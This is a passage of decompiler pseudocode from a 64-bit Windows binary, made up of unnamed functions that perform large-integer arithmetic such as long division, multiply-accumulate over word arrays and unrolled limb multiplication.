  unsigned __int64 v22; // rbx

  v4 = 0i64;
  v5 = v3 - 30;
  v6 = a3;
  if ( !a3 )
    return -1i64;
  v10 = sub_1400272A0(a3);
  v11 = a1 - v6;
  if ( a1 < v6 )
    v11 = a1;
  v12 = 64 - v10;
  if ( 64 != v10 )
  {
    v6 <<= v12;
    v11 = (v11 << (64 - (unsigned __int8)v10)) | (a2 >> v10);
    a2 <<= v12;
  }
  v13 = HIDWORD(v6);
  while ( 1 )
  {
    if ( HIDWORD(v11) == v13 )
      v14 = 0xFFFFFFFFi64;
    else
      v14 = v11 / v13;
    v15 = v13 * v14;
    v16 = (unsigned int)v6 * v14;
    v17 = v11 - v13 * v14;
    if ( (v17 & 0xFFFFFFFF00000000ui64) == 0 )
    {
      do
      {
        if ( v16 <= (HIDWORD(a2) | (v17 << 32)) )
          break;
        v15 -= v13;
        v17 = v11 - v15;
        --v14;
        v16 -= (unsigned int)v6;
      }
      while ( ((v11 - v15) & 0xFFFFFFFF00000000ui64) == 0 );
    }
    v18 = v16;
    v19 = v16 << 32;
    v20 = v15 + HIDWORD(v18);
    v21 = v20 + 1;
    if ( a2 >= v19 )
      v21 = v20;
    v22 = a2 - v19;
    if ( v11 < v21 )
    {
      v11 += v6;
      --v14;
    }
    if ( !--v5 )
      break;
    v11 = HIDWORD(v22) | ((v11 - v21) << 32);
    v4 = v14 << 32;
    a2 = v22 << 32;
  }
  return v4 | v14;
}
// 1400709DD: variable 'v3' is possibly undefined

//----- (0000000140070B50) ----------------------------------------------------
unsigned __int64 __fastcall sub_140070B50(char *a1, char *a2, int a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r11
  int v5; // edi
  __int64 v8; // rsi
  unsigned __int64 v9; // rbx
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // r9
  __int64 v12; // rdx
  __int64 v13; // rdx
  unsigned __int64 v14; // r9
  __int64 v15; // rax
  unsigned __int64 v16; // r10
  __int64 v17; // rdx
  unsigned __int64 v18; // r8
  bool v19; // cf
  unsigned __int64 v20; // r11
  __int64 v21; // r10
  __int64 v22; // r8
  unsigned __int64 v23; // rax
  __int64 v24; // r8
  unsigned __int64 v25; // r9
  __int64 v26; // rdx
  unsigned __int64 v27; // rdx
  unsigned __int64 v28; // r9
  unsigned __int64 v29; // rax
  unsigned __int64 v30; // r10
  unsigned __int64 v31; // rdx
  unsigned __int64 v32; // r8
  unsigned __int64 v33; // r11
  __int64 v34; // r10
  __int64 v35; // r8
  unsigned __int64 v36; // rax
  __int64 v37; // r8
  unsigned __int64 v38; // r9
  __int64 v39; // rdx
  unsigned __int64 v40; // rdx
  unsigned __int64 v41; // r9
  unsigned __int64 v42; // rax
  unsigned __int64 v43; // r10
  unsigned __int64 v44; // rdx
  unsigned __int64 v45; // r8
  unsigned __int64 v46; // r11
  __int64 v47; // r10
  __int64 v48; // r8
  unsigned __int64 v49; // rax
  __int64 v50; // r8
  unsigned __int64 v51; // r9
  __int64 v52; // rdx
  unsigned __int64 v53; // rdx
  unsigned __int64 v54; // r9
  unsigned __int64 v55; // rax
  unsigned __int64 v56; // r10
  unsigned __int64 v57; // rdx
  unsigned __int64 v58; // r8
  signed __int64 v59; // r14
  unsigned __int64 v60; // r8
  __int64 v61; // r10
  unsigned __int64 v62; // rax
  __int64 v63; // r8
  unsigned __int64 v64; // r9
  unsigned __int64 v65; // rax
  __int64 v66; // rdx
  unsigned __int64 v67; // r9
  unsigned __int64 v68; // rdx
  unsigned __int64 v69; // rax
  unsigned __int64 v70; // r10
  unsigned __int64 v71; // r8
  unsigned __int64 v72; // r9

  v4 = 0i64;
  v5 = a3;
  if ( a3 <= 0 )
    return 0i64;
  v8 = (unsigned int)a4;
  v9 = HIDWORD(a4);
  if ( (a3 & 0xFFFFFFFC) != 0 )
  {
    do
    {
      v10 = v8 * HIDWORD(*(_QWORD *)a2);
      v11 = v10 + v9 * (unsigned int)*(_QWORD *)a2;
      v12 = v9 * HIDWORD(*(_QWORD *)a2) + 0x100000000i64;
      if ( v11 >= v10 )
        v12 = v9 * HIDWORD(*(_QWORD *)a2);
      v13 = HIDWORD(v11) + v12;
      v14 = v11 << 32;
      v15 = v13 + 1;
      v16 = v14 + v8 * (unsigned int)*(_QWORD *)a2;
      if ( v16 >= v14 )
        v15 = v13;
      v17 = v15 + 1;
      if ( v16 + v4 >= v4 )
        v17 = v15;
      v18 = *(_QWORD *)a1 + v16 + v4;
      v19 = v18 < *(_QWORD *)a1;
      *(_QWORD *)a1 = v18;
      v20 = v17 + 1;
      v21 = (unsigned int)*((_QWORD *)a2 + 1);
      if ( !v19 )
        v20 = v17;
      v22 = HIDWORD(*((_QWORD *)a2 + 1));
      v23 = v8 * v22;
      v24 = v9 * v22;
      v25 = v23 + v9 * (unsigned int)v21;
      v26 = v24 + 0x100000000i64;
      if ( v25 >= v23 )
        v26 = v24;
      v27 = HIDWORD(v25) + v26;
      v28 = v25 << 32;
      v29 = v27 + 1;
      v30 = v28 + v8 * v21;
      if ( v30 >= v28 )
        v29 = v27;
      v31 = v29 + 1;
      if ( v30 + v20 >= v20 )
        v31 = v29;
      v32 = *((_QWORD *)a1 + 1) + v30 + v20;
      v19 = v32 < *((_QWORD *)a1 + 1);
      *((_QWORD *)a1 + 1) = v32;
      v33 = v31 + 1;
      v34 = (unsigned int)*((_QWORD *)a2 + 2);
      if ( !v19 )
        v33 = v31;
      v35 = HIDWORD(*((_QWORD *)a2 + 2));
      v36 = v8 * v35;
      v37 = v9 * v35;
      v38 = v36 + v9 * (unsigned int)v34;
      v39 = v37 + 0x100000000i64;
      if ( v38 >= v36 )
        v39 = v37;
      v40 = HIDWORD(v38) + v39;
      v41 = v38 << 32;
      v42 = v40 + 1;
      v43 = v41 + v8 * v34;
      if ( v43 >= v41 )
        v42 = v40;
      v44 = v42 + 1;
      if ( v43 + v33 >= v33 )
        v44 = v42;
      v45 = *((_QWORD *)a1 + 2) + v43 + v33;
      v19 = v45 < *((_QWORD *)a1 + 2);
      *((_QWORD *)a1 + 2) = v45;
      v46 = v44 + 1;
      v47 = (unsigned int)*((_QWORD *)a2 + 3);
      if ( !v19 )
        v46 = v44;
      v48 = HIDWORD(*((_QWORD *)a2 + 3));
      v49 = v8 * v48;
      v50 = v9 * v48;
      v51 = v49 + v9 * (unsigned int)v47;
      v52 = v50 + 0x100000000i64;
      if ( v51 >= v49 )
        v52 = v50;
      v53 = HIDWORD(v51) + v52;
      v54 = v51 << 32;
      v55 = v53 + 1;
      v56 = v54 + v8 * v47;
      if ( v56 >= v54 )
        v55 = v53;
      v57 = v55 + 1;
      if ( v56 + v46 >= v46 )
        v57 = v55;
      v58 = *((_QWORD *)a1 + 3) + v56 + v46;
      v19 = v58 < *((_QWORD *)a1 + 3);
      *((_QWORD *)a1 + 3) = v58;
      v4 = v57 + 1;
      if ( !v19 )
        v4 = v57;
      a2 += 32;
      a1 += 32;
      v5 -= 4;
    }
    while ( (v5 & 0xFFFFFFFC) != 0 );
  }
  if ( v5 )
  {
    v59 = a2 - a1;
    do
    {
      v60 = *(_QWORD *)&a1[v59];
      a1 += 8;
      v61 = (unsigned int)v60;
      v60 >>= 32;
      v62 = v8 * v60;
      v63 = v9 * v60;
      v64 = v62 + v9 * (unsigned int)v61;
      v19 = v64 < v62;
      v65 = v64;
      v66 = v63 + 0x100000000i64;
      if ( !v19 )
        v66 = v63;
      v67 = v64 << 32;
      v68 = HIDWORD(v65) + v66;
      v69 = v68 + 1;
      v70 = v67 + v8 * v61;
      if ( v70 >= v67 )
        v69 = v68;
      v71 = v69 + 1;
      if ( v70 + v4 >= v4 )
        v71 = v69;
      v72 = *((_QWORD *)a1 - 1) + v70 + v4;
      v19 = v72 < *((_QWORD *)a1 - 1);
      *((_QWORD *)a1 - 1) = v72;
      v4 = v71 + 1;
      if ( !v19 )
        v4 = v71;
      --v5;
    }
    while ( v5 );
  }
  return v4;
}

//----- (0000000140070E20) ----------------------------------------------------
unsigned __int64 __fastcall sub_140070E20(unsigned __int64 *a1, unsigned __int64 *a2, _QWORD *a3)
{
  __int64 v5; // rbx
  unsigned __int64 v7; // r10
  __int64 v8; // r11
  unsigned __int64 v9; // rax
  __int64 v10; // r9
  __int64 v11; // r10
  unsigned __int64 v12; // rdx
  __int64 v13; // rcx
  __int64 v14; // rcx
  unsigned __int64 v15; // rdx
  __int64 v16; // rdi
  unsigned __int64 v17; // rbx
  bool v18; // cf
  unsigned __int64 v19; // rdx
  __int64 v20; // r10
  unsigned __int64 v21; // rcx
  __int64 v22; // r8
  unsigned __int64 v23; // rdx
  __int64 v24; // r9
  unsigned __int64 v25; // rax
  __int64 v26; // rdx
  unsigned __int64 v27; // r8
  __int64 v28; // rcx
  __int64 v29; // rcx
  unsigned __int64 v30; // r8
  __int64 v31; // rax
  unsigned __int64 v32; // r10
  __int64 v33; // r11
  __int64 v34; // rsi
  __int64 v35; // rcx
  __int64 v36; // rbp
  __int64 v37; // r15
  __int64 v38; // r10
  unsigned __int64 v39; // r8
  __int64 v40; // rcx
  unsigned __int64 v41; // rax
  __int64 v42; // r8
  __int64 v43; // rdx
  unsigned __int64 v44; // r9
  __int64 v45; // rbx
  unsigned __int64 v46; // rdx
  unsigned __int64 v47; // r9
  unsigned __int64 v48; // rcx
  unsigned __int64 v49; // r11
  unsigned __int64 v50; // rsi
  unsigned __int64 v51; // rax
  unsigned __int64 v52; // rbp
  __int64 v53; // r10
  __int64 v54; // rcx
  unsigned __int64 v55; // r8
  unsigned __int64 v56; // rax
  __int64 v57; // r8
  unsigned __int64 v58; // r9
  __int64 v59; // rdx
  unsigned __int64 v60; // r8
  unsigned __int64 v61; // rdx
  unsigned __int64 v62; // r9
  unsigned __int64 v63; // rcx
  unsigned __int64 v64; // r11
  unsigned __int64 v65; // rbp
  __int64 v66; // r11
  __int64 v67; // r9
  unsigned __int64 v68; // rax
  __int64 v69; // r10
  unsigned __int64 v70; // r14
  _BOOL8 v71; // rbx
  __int64 v72; // rcx
  unsigned __int64 v73; // r8
  _BOOL8 v74; // rdi
  unsigned __int64 v75; // rax
  __int64 v76; // r8
  unsigned __int64 v77; // r9
  __int64 v78; // rdx
  unsigned __int64 v79; // rdx
  unsigned __int64 v80; // r9
  unsigned __int64 v81; // rcx
  unsigned __int64 v82; // r11
  unsigned __int64 v83; // rbp
  unsigned __int64 v84; // rax
  unsigned __int64 v85; // r14
  __int64 v86; // r10
  __int64 v87; // rcx
  _BOOL8 v88; // rbx
  unsigned __int64 v89; // rax
  unsigned __int64 v90; // r9
  __int64 v91; // rdx
  __int64 v92; // rdx
  unsigned __int64 v93; // r9
  __int64 v94; // rcx
  unsigned __int64 v95; // r11
  unsigned __int64 v96; // rbp
  unsigned __int64 v97; // rax
  unsigned __int64 v98; // r14
  __int64 v99; // r10
  __int64 v100; // rcx
  unsigned __int64 v101; // rax
  __int64 v102; // r8
  unsigned __int64 v103; // rax
  __int64 v104; // rdx
  unsigned __int64 v105; // r9
  unsigned __int64 v106; // r8
  unsigned __int64 v107; // rdx
  unsigned __int64 v108; // r9
  unsigned __int64 v109; // rcx
  unsigned __int64 v110; // r11
  unsigned __int64 v111; // r14
  __int64 v112; // r11
  __int64 v113; // r9
  unsigned __int64 v114; // rax
  __int64 v115; // r10
  unsigned __int64 v116; // rbp
  _BOOL8 v117; // rbx
  __int64 v118; // rcx
  unsigned __int64 v119; // rax
  unsigned __int64 v120; // r8
  unsigned __int64 v121; // rax
  unsigned __int64 v122; // rdx
  unsigned __int64 v123; // r9
  _BOOL8 v124; // rdi
  unsigned __int64 v125; // r8
  unsigned __int64 v126; // rdx
  unsigned __int64 v127; // r9
  unsigned __int64 v128; // rcx
  unsigned __int64 v129; // r11
  unsigned __int64 v130; // r14
  __int64 v131; // r11
  __int64 v132; // r9
  unsigned __int64 v133; // rax
  unsigned __int64 v134; // rbp
  __int64 v135; // r10
  __int64 v136; // rcx
  unsigned __int64 v137; // r8
  unsigned __int64 v138; // rax
  __int64 v139; // r8
  unsigned __int64 v140; // r9
  __int64 v141; // rdx
  _BOOL8 v142; // rsi
  unsigned __int64 v143; // r8
  unsigned __int64 v144; // rdx
  unsigned __int64 v145; // r9
  unsigned __int64 v146; // rcx
  unsigned __int64 v147; // r11
  unsigned __int64 v148; // r14
  __int64 v149; // r11
  __int64 v150; // r9
  unsigned __int64 v151; // rax
  unsigned __int64 v152; // rbp
  __int64 v153; // r10
  __int64 v154; // rcx
  unsigned __int64 v155; // r8
  _BOOL8 v156; // rbx
  unsigned __int64 v157; // rax
  __int64 v158; // r8
  unsigned __int64 v159; // r9
  __int64 v160; // rdx
  unsigned __int64 v161; // rdx
  unsigned __int64 v162; // r9
  unsigned __int64 v163; // rcx
  unsigned __int64 v164; // r11
  unsigned __int64 v165; // r14
  unsigned __int64 v166; // rax
  unsigned __int64 v167; // rbp
  __int64 v168; // r10
  __int64 v169; // rcx
  unsigned __int64 v170; // rax
  __int64 v171; // r8
  unsigned __int64 v172; // rax
  __int64 v173; // rdx
  unsigned __int64 v174; // r9
  unsigned __int64 v175; // r8
  unsigned __int64 v176; // rdx
  unsigned __int64 v177; // r9
  unsigned __int64 v178; // rcx
  unsigned __int64 v179; // r11
  unsigned __int64 v180; // rbp
  __int64 v181; // r11
  __int64 v182; // r9
  unsigned __int64 v183; // rax
  __int64 v184; // r10
  unsigned __int64 v185; // rsi
  _BOOL8 v186; // rbx
  __int64 v187; // rcx
  unsigned __int64 v188; // rax
  unsigned __int64 v189; // r8
  unsigned __int64 v190; // rax
  unsigned __int64 v191; // rdx
  _BOOL8 v192; // rdi
  unsigned __int64 v193; // r9
  unsigned __int64 v194; // r8
  unsigned __int64 v195; // rdx
  unsigned __int64 v196; // r9
  unsigned __int64 v197; // rcx
  unsigned __int64 v198; // r11
  unsigned __int64 v199; // rbp
  __int64 v200; // r11
  __int64 v201; // r9
  unsigned __int64 v202; // rax
  unsigned __int64 v203; // rsi
  __int64 v204; // r10
  unsigned __int64 v205; // r8
  __int64 v206; // rcx
  unsigned __int64 v207; // rax
  __int64 v208; // r8
  unsigned __int64 v209; // r9
  _BOOL8 v210; // rbx
  __int64 v211; // rdx
  unsigned __int64 v212; // rdx
  unsigned __int64 v213; // r9
  unsigned __int64 v214; // rcx
  unsigned __int64 v215; // r11
  unsigned __int64 v216; // rbp
  unsigned __int64 v217; // rax
  unsigned __int64 v218; // rsi
  __int64 v219; // r10
  __int64 v220; // rcx
  unsigned __int64 v221; // r8
  unsigned __int64 v222; // rax
  __int64 v223; // r8
  unsigned __int64 v224; // r9
  __int64 v225; // rdx
  unsigned __int64 v226; // r8
  unsigned __int64 v227; // rdx
  unsigned __int64 v228; // r9
  unsigned __int64 v229; // rcx
  unsigned __int64 v230; // r11
  unsigned __int64 v231; // rsi
  __int64 v232; // r11
  __int64 v233; // r9
  unsigned __int64 v234; // rax
  __int64 v235; // r10
  unsigned __int64 v236; // rdi
  __int64 v237; // rcx
  unsigned __int64 v238; // r8
  unsigned __int64 v239; // rax
  __int64 v240; // r8
  unsigned __int64 v241; // r9
  __int64 v242; // rdx
  unsigned __int64 v243; // rdx
  unsigned __int64 v244; // r9
  unsigned __int64 v245; // rcx
  unsigned __int64 v246; // r11
  unsigned __int64 v247; // rsi
  unsigned __int64 v248; // rax
  unsigned __int64 v249; // r8
  __int64 v250; // rbx
  unsigned __int64 v251; // rdi
  __int64 v252; // r10
  __int64 v253; // r11
  __int64 v254; // rcx
  __int64 v255; // r9
  unsigned __int64 v256; // r8
  unsigned __int64 v257; // rax
  __int64 v258; // r8
  unsigned __int64 v259; // r9
  __int64 v260; // rdx
  __int64 v261; // rdx
  unsigned __int64 v262; // r9
  __int64 v263; // rcx
  unsigned __int64 v264; // r11
  unsigned __int64 v265; // rdi
  __int64 v266; // rax
  unsigned __int64 result; // rax

  v5 = (unsigned int)*a2;
  v7 = HIDWORD(*a2);
  v8 = (unsigned int)*a3;
  v9 = v8 * v7;
  v10 = HIDWORD(*a3);
  v11 = v10 * v7;
  v12 = v9 + v10 * v5;
  v13 = v11 + 0x100000000i64;
  if ( v12 >= v9 )
    v13 = v11;
  v14 = HIDWORD(v12) + v13;
  v15 = v12 << 32;
  v16 = v14 + 1;
  v17 = v15 + v8 * v5;
  v18 = v17 < v15;
  *a1 = v17;
  v19 = *a2;
  if ( !v18 )
    v16 = v14;
  v20 = (unsigned int)v19;
  v21 = a3[1];
  v22 = (unsigned int)v19;
  v23 = HIDWORD(v19);
  v24 = (unsigned int)v21;
  v25 = (unsigned int)v21 * v23;
  v21 >>= 32;
  v26 = v21 * v23;
  v27 = v25 + v21 * v22;
  v28 = v26 + 0x100000000i64;
  if ( v27 >= v25 )
    v28 = v26;
  v29 = HIDWORD(v27) + v28;
  v30 = v27 << 32;
  v31 = v29 + 1;
  v32 = v30 + v24 * v20;
  v33 = (unsigned int)a2[1];
  if ( v32 >= v30 )
    v31 = v29;
  v34 = v32 + v16;
  v35 = v31 + 1;
  if ( v32 + v16 >= v32 )
    v35 = v31;
  v36 = v35;
  v37 = 0i64;
  v38 = (unsigned int)*a3;
  v39 = HIDWORD(a2[1]);
  v40 = HIDWORD(*a3);
  v41 = v38 * v39;
  v42 = v40 * v39;
  v43 = v42 + 0x100000000i64;
  v44 = v41 + v40 * (unsigned int)v33;
  if ( v44 >= v41 )
    v43 = v42;
  v45 = 1i64;
  v46 = HIDWORD(v44) + v43;
  v47 = v44 << 32;
  v48 = v46 + 1;
  v49 = v47 + v38 * v33;
  if ( v49 >= v47 )
    v48 = v46;
  v50 = v49 + v34;
  a1[1] = v50;
  v51 = v48 + 1;
  if ( v50 >= v49 )
    v51 = v48;
  v52 = v51 + v36;
  v53 = (unsigned int)*a3;
  if ( v52 >= v51 )
    v45 = 0i64;
  v54 = HIDWORD(*a3);
  v55 = HIDWORD(a2[2]);
  v56 = v53 * v55;
  v57 = v54 * v55;
  v58 = v56 + v54 * (unsigned int)a2[2];
  v59 = v57 + 0x100000000i64;
  if ( v58 >= v56 )
    v59 = v57;
  v60 = a2[1];
  v61 = HIDWORD(v58) + v59;
  v62 = v58 << 32;
  v63 = v61 + 1;
  v64 = v62 + v53 * (unsigned int)a2[2];
  if ( v64 >= v62 )
    v63 = v61;
  v65 = v64 + v52;
  v18 = v65 < v64;
  v66 = (unsigned int)v60;
  v67 = (unsigned int)v60;
  v68 = v63 + 1;
  if ( !v18 )
    v68 = v63;
  v69 = (unsigned int)a3[1];
  v70 = v68 + v45;
  v71 = v68 + v45 < v68;
  v72 = HIDWORD(a3[1]);
  v73 = HIDWORD(v60);
  v74 = v71 + 1;
  v75 = v69 * v73;
  v76 = v72 * v73;
  v77 = v75 + v72 * v67;
  v78 = v76 + 0x100000000i64;
  if ( v77 >= v75 )
    v78 = v76;
  v79 = HIDWORD(v77) + v78;
  v80 = v77 << 32;
  v81 = v79 + 1;
  v82 = v80 + v69 * v66;
  if ( v82 >= v80 )
    v81 = v79;
  v83 = v82 + v65;
  v84 = v81 + 1;
  if ( v83 >= v82 )
    v84 = v81;
  v85 = v84 + v70;
  if ( v85 >= v84 )
    v74 = v71;
  v86 = (unsigned int)a3[2];
  v87 = HIDWORD(a3[2]);
  v88 = v74 + 1;
  v89 = v86 * HIDWORD(*a2);
  v90 = v89 + v87 * (unsigned int)*a2;
  v91 = v87 * HIDWORD(*a2) + 0x100000000i64;
  if ( v90 >= v89 )
    v91 = v87 * HIDWORD(*a2);
  v92 = HIDWORD(v90) + v91;
  v93 = v90 << 32;
  v94 = v92 + 1;
  v95 = v93 + v86 * (unsigned int)*a2;
  if ( v95 >= v93 )
    v94 = v92;
  v96 = v95 + v83;
  v97 = v94 + 1;
  if ( v96 >= v95 )
    v97 = v94;
  v98 = v97 + v85;
  if ( v98 >= v97 )
    v88 = v74;
  a1[2] = v96;
  v99 = (unsigned int)a3[3];
  v100 = HIDWORD(a3[3]);
  v101 = HIDWORD(*a2);
  v102 = v100 * v101;
  v103 = v99 * v101;
  v104 = v102 + 0x100000000i64;
  v105 = v103 + v100 * (unsigned int)*a2;
  if ( v105 >= v103 )
    v104 = v102;
  v106 = a2[1];
  v107 = HIDWORD(v105) + v104;
  v108 = v105 << 32;
  v109 = v107 + 1;
  v110 = v108 + v99 * (unsigned int)*a2;
  if ( v110 >= v108 )
    v109 = v107;
  v111 = v110 + v98;
  v18 = v111 < v110;
  v112 = (unsigned int)v106;
  v113 = (unsigned int)v106;
  v114 = v109 + 1;
  if ( !v18 )
    v114 = v109;
  v115 = (unsigned int)a3[2];
  v116 = v114 + v88;
  v117 = v114 + v88 < v114;
  v118 = HIDWORD(a3[2]);
  v119 = HIDWORD(v106);
  v120 = v118 * HIDWORD(v106);
  v121 = v115 * v119;
  v122 = v120 + 0x100000000i64;
  v123 = v121 + v118 * v113;
  if ( v123 >= v121 )
    v122 = v120;
  v124 = v117 + 1;
  v125 = a2[2];
  v126 = HIDWORD(v123) + v122;
  v127 = v123 << 32;
  v128 = v126 + 1;
  v129 = v127 + v115 * v112;
  if ( v129 >= v127 )
    v128 = v126;
  v130 = v129 + v111;
  v18 = v130 < v129;
  v131 = (unsigned int)v125;
  v132 = (unsigned int)v125;
  v133 = v128 + 1;
  if ( !v18 )
    v133 = v128;
  v134 = v133 + v116;
  v135 = (unsigned int)a3[1];
  if ( v134 >= v133 )
    v124 = v117;
  v136 = HIDWORD(a3[1]);
  v137 = HIDWORD(v125);
  v138 = v135 * v137;
  v139 = v136 * v137;
  v140 = v138 + v136 * v132;
  v141 = v139 + 0x100000000i64;
  if ( v140 >= v138 )
    v141 = v139;
  v142 = v124 + 1;
  v143 = a2[3];
  v144 = HIDWORD(v140) + v141;
  v145 = v140 << 32;
  v146 = v144 + 1;
  v147 = v145 + v135 * v131;
  if ( v147 >= v145 )
    v146 = v144;
  v148 = v147 + v130;
  v18 = v148 < v147;
  v149 = (unsigned int)v143;
  v150 = (unsigned int)v143;
  v151 = v146 + 1;
  if ( !v18 )
    v151 = v146;
  v152 = v151 + v134;
  v153 = (unsigned int)*a3;
  if ( v152 >= v151 )
    v142 = v124;
  v154 = HIDWORD(*a3);
  v155 = HIDWORD(v143);
  v156 = v142 + 1;
  v157 = v153 * v155;
  v158 = v154 * v155;
  v159 = v157 + v154 * v150;
  v160 = v158 + 0x100000000i64;
  if ( v159 >= v157 )
    v160 = v158;
  v161 = HIDWORD(v159) + v160;
  v162 = v159 << 32;
  v163 = v161 + 1;
  v164 = v162 + v153 * v149;
  if ( v164 >= v162 )
    v163 = v161;
  v165 = v164 + v148;
  v166 = v163 + 1;
  if ( v165 >= v164 )
    v166 = v163;
  v167 = v166 + v152;
  if ( v167 >= v166 )
    v156 = v142;
  a1[3] = v165;
  v168 = (unsigned int)a3[1];
  v169 = HIDWORD(a3[1]);
  v170 = HIDWORD(a2[3]);
  v171 = v169 * v170;
  v172 = v168 * v170;
  v173 = v171 + 0x100000000i64;
  v174 = v172 + v169 * (unsigned int)a2[3];
  if ( v174 >= v172 )
    v173 = v171;
  v175 = a2[2];
  v176 = HIDWORD(v174) + v173;
  v177 = v174 << 32;
  v178 = v176 + 1;
  v179 = v177 + v168 * (unsigned int)a2[3];
  if ( v179 >= v177 )
    v178 = v176;
  v180 = v179 + v167;
  v18 = v180 < v179;
  v181 = (unsigned int)v175;
  v182 = (unsigned int)v175;
  v183 = v178 + 1;
  if ( !v18 )
    v183 = v178;
  v184 = (unsigned int)a3[2];
  v185 = v183 + v156;
  v186 = v183 + v156 < v183;
  v187 = HIDWORD(a3[2]);
  v188 = HIDWORD(v175);
  v189 = v187 * HIDWORD(v175);
  v190 = v184 * v188;
  v191 = v189 + 0x100000000i64;
  v192 = v186 + 1;
  v193 = v190 + v187 * v182;
  if ( v193 >= v190 )
    v191 = v189;
  v194 = a2[1];
  v195 = HIDWORD(v193) + v191;
  v196 = v193 << 32;
  v197 = v195 + 1;
  v198 = v196 + v184 * v181;
  if ( v198 >= v196 )
    v197 = v195;
  v199 = v198 + v180;
  v18 = v199 < v198;
  v200 = (unsigned int)v194;
  v201 = (unsigned int)v194;
  v202 = v197 + 1;
  if ( !v18 )
    v202 = v197;
  v203 = v202 + v185;
  v204 = (unsigned int)a3[3];
  if ( v203 >= v202 )
    v192 = v186;
  v205 = HIDWORD(v194);
  v206 = HIDWORD(a3[3]);
  v207 = v204 * v205;
  v208 = v206 * v205;
  v209 = v207 + v206 * v201;
  v210 = v192 + 1;
  v211 = v208 + 0x100000000i64;
  if ( v209 >= v207 )
    v211 = v208;
  v212 = HIDWORD(v209) + v211;
  v213 = v209 << 32;
  v214 = v212 + 1;
  v215 = v213 + v204 * v200;
  if ( v215 >= v213 )
    v214 = v212;
  v216 = v215 + v199;
  a1[4] = v216;
  v217 = v214 + 1;
  if ( v216 >= v215 )
    v217 = v214;
  v218 = v217 + v203;
  v219 = (unsigned int)a3[3];
  if ( v218 >= v217 )
    v210 = v192;
  v220 = HIDWORD(a3[3]);
  v221 = HIDWORD(a2[2]);
  v222 = v219 * v221;
  v223 = v220 * v221;
  v224 = v222 + v220 * (unsigned int)a2[2];
  v225 = v223 + 0x100000000i64;
  if ( v224 >= v222 )
    v225 = v223;
  v226 = a2[3];
  v227 = HIDWORD(v224) + v225;
  v228 = v224 << 32;
  v229 = v227 + 1;
  v230 = v228 + v219 * (unsigned int)a2[2];
  if ( v230 >= v228 )
    v229 = v227;
  v231 = v230 + v218;
  v18 = v231 < v230;
  v232 = (unsigned int)v226;
  v233 = (unsigned int)v226;
  v234 = v229 + 1;
  if ( !v18 )
    v234 = v229;
  v235 = (unsigned int)a3[2];
  v236 = v234 + v210;
  LOBYTE(v37) = v234 + v210 < v234;
  v237 = HIDWORD(a3[2]);
  v238 = HIDWORD(v226);
  v239 = v235 * v238;
  v240 = v237 * v238;
  v241 = v239 + v237 * v233;
  v242 = v240 + 0x100000000i64;
  if ( v241 >= v239 )
    v242 = v240;
  v243 = HIDWORD(v241) + v242;
  v244 = v241 << 32;
  v245 = v243 + 1;
  v246 = v244 + v235 * v232;
  if ( v246 >= v244 )
    v245 = v243;
  v247 = v246 + v231;
  v248 = v245 + 1;
  if ( v247 >= v246 )
    v248 = v245;
  a1[5] = v247;
  v249 = a2[3];
  v250 = v37 + 1;
  v251 = v248 + v236;
  v252 = (unsigned int)a3[3];
  if ( v251 >= v248 )
    v250 = v37;
  v253 = (unsigned int)v249;
  v254 = HIDWORD(a3[3]);
  v255 = v254 * (unsigned int)v249;
  v256 = HIDWORD(v249);
  v257 = v252 * v256;
  v258 = v254 * v256;
  v259 = v257 + v255;
  v260 = v258 + 0x100000000i64;
  if ( v259 >= v257 )
    v260 = v258;
  v261 = HIDWORD(v259) + v260;
  v262 = v259 << 32;
  v263 = v261 + 1;
  v264 = v262 + v252 * v253;
  if ( v264 >= v262 )
    v263 = v261;
  v265 = v264 + v251;
  a1[6] = v265;
  v266 = v263 + 1;
  if ( v265 >= v264 )
    v266 = v263;
  result = v250 + v266;
  a1[7] = result;
  return result;
}

//----- (00000001400715D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400715D0(unsigned __int64 *a1, unsigned __int64 *a2, _QWORD *a3)
{
  __int64 v5; // rbx
  unsigned __int64 v7; // r10
  __int64 v8; // r11
  unsigned __int64 v9; // rax
  __int64 v10; // r9
  __int64 v11; // r10
  unsigned __int64 v12; // rdx
  __int64 v13; // rcx
  __int64 v14; // rcx
  unsigned __int64 v15; // rdx
  __int64 v16; // rdi
  unsigned __int64 v17; // rbx
  bool v18; // cf
  unsigned __int64 v19; // rdx
  __int64 v20; // r10
  unsigned __int64 v21; // rcx
  __int64 v22; // r9
  __int64 v23; // r8
  unsigned __int64 v24; // rax
  unsigned __int64 v25; // rdx
  unsigned __int64 v26; // rax
  unsigned __int64 v27; // rcx
  unsigned __int64 v28; // r8
  unsigned __int64 v29; // rcx
  unsigned __int64 v30; // r8
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // r10
  __int64 v33; // r11
  __int64 v34; // rsi
  unsigned __int64 v35; // rcx
  unsigned __int64 v36; // rbp
  __int64 v37; // r10
  unsigned __int64 v38; // r8
  __int64 v39; // rcx
  unsigned __int64 v40; // rax
  __int64 v41; // r8
  __int64 v42; // rdx
  unsigned __int64 v43; // r9
  __int64 v44; // r14
  unsigned __int64 v45; // rdx
  unsigned __int64 v46; // r9
  unsigned __int64 v47; // rcx
  unsigned __int64 v48; // r11
  unsigned __int64 v49; // rsi
  unsigned __int64 v50; // rax
  unsigned __int64 v51; // rbp
  __int64 v52; // r10
  __int64 v53; // rcx
  unsigned __int64 v54; // r8
  unsigned __int64 v55; // rax
  __int64 v56; // r8
  unsigned __int64 v57; // r9
  __int64 v58; // rdx
  unsigned __int64 v59; // r8
  unsigned __int64 v60; // rdx
  unsigned __int64 v61; // r9
  unsigned __int64 v62; // rcx
  unsigned __int64 v63; // r11
  unsigned __int64 v64; // rbp
  __int64 v65; // r11
  __int64 v66; // r9
  unsigned __int64 v67; // rax
  unsigned __int64 v68; // r14
  __int64 v69; // r10
  _BOOL8 v70; // rbx
  __int64 v71; // rcx
  unsigned __int64 v72; // r8
  _BOOL8 v73; // rdi
  unsigned __int64 v74; // rax
  __int64 v75; // r8
  unsigned __int64 v76; // r9
  __int64 v77; // rdx
  unsigned __int64 v78; // rdx
  unsigned __int64 v79; // r9
  unsigned __int64 v80; // rcx
  unsigned __int64 v81; // r11
  unsigned __int64 v82; // rbp
  unsigned __int64 v83; // rax
  unsigned __int64 v84; // r14
  unsigned __int64 v85; // r8
  unsigned __int64 v86; // rcx
  __int64 v87; // r10
  unsigned __int64 v88; // rcx
  __int64 v89; // r11
  unsigned __int64 v90; // rax
  _BOOL8 v91; // rbx
  unsigned __int64 v92; // r8
